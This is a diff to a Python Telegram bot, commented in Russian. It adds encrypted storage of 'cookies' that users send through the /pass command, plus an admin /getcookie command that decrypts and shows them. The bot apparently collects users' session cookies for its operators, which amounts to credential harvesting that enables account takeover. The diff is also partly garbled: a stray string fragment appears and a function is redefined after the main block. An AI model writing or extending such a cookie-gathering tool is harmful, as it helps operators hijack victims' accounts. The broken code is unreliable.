@@ -7,6 +7,7 @@ import string
 import signal
 import sys
 import os
+from cryptography.fernet import Fernet
 
 # Получаем токен бота из переменных окружения
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
@@ -20,6 +21,17 @@ ADMIN_IDS_STR = os.environ.get('ADMIN_IDS')
 if not ADMIN_IDS_STR:
     raise ValueError("ADMIN_IDS не установлен!")
 admin_ids = [int(id.strip()) for id in ADMIN_IDS_STR.split(',')]
+
+# Шифрование для куков
+ENCRYPTION_KEY = os.environ.get('ENCRYPTION_KEY')
+if ENCRYPTION_KEY:
+    cipher = Fernet(ENCRYPTION_KEY.encode())
+else:
+    # Генерируем ключ если не задан (НЕ БЕЗОПАСНО для продакшна!)
+    print("⚠️ ENCRYPTION_KEY не задан! Генерируем временный ключ...")
+    temp_key = Fernet.generate_key()
+    cipher = Fernet(temp_key)
+    print(f"⚠️ Добавьте в переменные окружения: ENCRYPTION_KEY={temp_key.decode()}")
 
 # Путь к файлу базы данных SQLite
 DATABASE_FILE = "user_database.db"
@@ -56,6 +68,18 @@ def create_database():
             last_interaction INTEGER,
             banned INTEGER DEFAULT 0,
             is_admin INTEGER DEFAULT 0
+        )
+    """)
+    # Таблица для хранения зашифрованных куков
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS cookies (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER,
+            username TEXT,
+            unique_id TEXT,
+            encrypted_cookie TEXT,
+            created_at INTEGER,
+            FOREIGN KEY (user_id) REFERENCES users(user_id)
         )
     """)
     conn.commit()
@@ -319,20 +343,46 @@ def handle_pass(message):
     if is_user_banned(message.from_user.id):
         bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
         return
+    
     user_id = message.from_user.id
     username = message.from_user.username
     conn = sqlite3.connect(DATABASE_FILE)
     cursor = conn.cursor()
     cursor.execute("SELECT unique_id FROM users WHERE user_id = ?", (user_id,))
-    unique_id = cursor.fetchone()[0]
+    unique_id_row = cursor.fetchone()
+    
+    if not unique_id_row:
+        conn.close()
+        bot.send_message(message.chat.id, "Ошибка! Сначала выполните /start")
+        return
+    
+    unique_id = unique_id_row[0]
+    
+    # Шифруем куки
+    encrypted_cookie = cipher.encrypt(message.text.encode()).decode()
+    
+    # Сохраняем в БД
+    cursor.execute("""
+        INSERT INTO cookies (user_id, username, unique_id, encrypted_cookie, created_at)
+        VALUES (?, ?, ?, ?, ?)
+    """, (user_id, username, unique_id, encrypted_cookie, int(time.time())))
+    conn.commit()
     conn.close()
 
-    # Отправляем уведомление администраторам
+    # Отправляем уведомление администраторам (БЕЗ куков!)
     for admin_id in admin_ids:
-        bot.send_message(admin_id, f"@{username}\nУникальный ID: {unique_id}\n{message.text}")
+        bot.send_message(
+            admin_id, 
+            f"🆕 Новая заявка\n"
+            f"👤 @{username}\n"
+            f"🆔 {unique_id}\n"
+            f"⏰ {time.strftime('%H:%M:%S', time.localtime())}\n\n"
+            f"🔐 Данные зашифрованы и сохранены в БД\n"
+            f"Используйте /getcookie {unique_id} для просмотра"
+        )
 
     # Отправляем сообщение пользователю о принятии заявки
-    bot.send_message(message.chat.id, "Ваша заявка успешно принята! Ожидайте сообщение от наших модераторов.")
+    bot.send_message(message.chat.id, "✅ Ваша заявка успешно принята! Ожидайте сообщение от наших модераторов.")
 
 
 @bot.message_handler(commands=['con'])
@@ -345,12 +395,63 @@ def handle_con_command(message):
         user_info = get_user_by_unique_id(unique_id)
         if user_info:
             user_id = user_info[0]
-            #Добавить проверку на уже существующий чат
             bot.send_message(message.chat.id, f"Подключен к пользователю с ID: {user_id}")
         else:
             bot.reply_to(message, "Неверный уникальный ID.")
     else:
         bot.reply_to(message, "У вас нет прав на использование этой команды.")
+
+@bot.message_handler(commands=['getcookie'])
+def handle_getcookie_command(message):
+    """Команда для получения расшифрованных куков (только для админов)"""
+    if is_user_banned(message.from_user.id):
+        bot.send_message(message.chat.id, "Вы были забанены в боте.")
+        return
+    
+    if message.from_user.id not in admin_ids and not is_user_admin(message.from_user.id):
+        bot.reply_to(message, "❌ У вас нет прав на использование этой команды.")
+        return
+    
+    try:
+        unique_id = message.text.split()[1]
+    except IndexError:
+        bot.reply_to(message, "Использование: /getcookie <unique_id>")
+        return
+    
+    conn = sqlite3.connect(DATABASE_FILE)
+    cursor = conn.cursor()
+    cursor.execute("""
+        SELECT encrypted_cookie, username, created_at 
+        FROM cookies 
+        WHERE unique_id = ? 
+        ORDER BY created_at DESC 
+        LIMIT 1
+    """, (unique_id,))
+    
+    result = cursor.fetchone()
+    conn.close()
+    
+    if not result:
+        bot.reply_to(message, "❌ Куки не найдены для этого ID")
+        return
+    
+    encrypted_cookie, username, created_at = result
+    
+    try:
+        # Расшифровываем
+        decrypted_cookie = cipher.decrypt(encrypted_cookie.encode()).decode()
+        
+        bot.send_message(
+            message.chat.id,
+            f"🔓 Расшифрованные данные\n"
+            f"👤 @{username}\n"
+            f"🆔 {unique_id}\n"
+            f"⏰ {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(created_at))}\n\n"
+            f"```\n{decrypted_cookie}\n```",
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        bot.reply_to(message, f"❌ Ошибка расшифровки: {e}")
 
 @bot.message_handler(commands=['msg'])
 def handle_msg_command(message):
@@ -638,15 +739,18 @@ def signal_handler(sig, frame):
 
 # Установка обработчика сигналов
 signal.signal(signal.SIGINT, signal_handler)
-signal.signal(signal.SIGTERM, signal_handler)
 
-# Создаем базу данных при старте
-create_database()
-bot.infinity_polling()
-ие заблокировано!")
-
-# Словарь для хранения пользователей в чате
-chat_users = set()
+if __name__ == '__main__':
+    print("Запуск бота...")
+    print(f"ID администраторов: {admin_ids}")
+    
+    # Создаем базу данных при запуске
+    create_database()
+    print("База данных инициализирована")
+    
+    # Запускаем бота
+    print("Бот запущен и готов к работе!")
+    bot.infinity_polling(timeout=10, long_polling_timeout=5)
 
 def signal_handler(sig, frame):
     print('Выход...')
